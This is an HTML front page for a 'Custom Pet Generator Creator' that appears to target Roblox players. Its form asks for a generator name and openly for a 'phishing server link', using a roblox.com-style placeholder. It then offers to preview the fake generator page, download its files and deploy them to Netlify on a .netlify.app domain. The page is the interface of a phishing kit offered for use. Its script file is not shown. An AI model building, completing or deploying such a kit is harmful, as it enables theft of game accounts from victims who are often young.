<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Custom Pet Generator Creator</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h1>Custom Pet Generator Creator</h1>

    <div class="box">
      <label for="genName">Enter your generator name</label>
      <input type="text" id="genName" placeholder="MyPetGen" />
      <label for="serverLink">Enter your phishing server link</label>
      <input type="text" id="serverLink" placeholder="https://roblox.com/..." />
      <button id="generatePageBtn">Generate Custom Generator</button>
    </div>

    <div class="box" id="previewBox" style="display:none;">
      <h3>Preview</h3>
      <iframe id="previewFrame" width="100%" height="400px"></iframe>
      <button id="downloadBtn">Download Files</button>
      <button id="deployBtn">Deploy to Netlify</button>
      <p class="deployMsg">
        After downloading, deploy these files to <strong>Netlify</strong> to get your own <em>.netlify.app</em> domain!
      </p>
    </div>

    <p class="footer">Made by @vyxlez.v2</p>
  </div>

  <script src="script.js"></script>
</body>
</html>
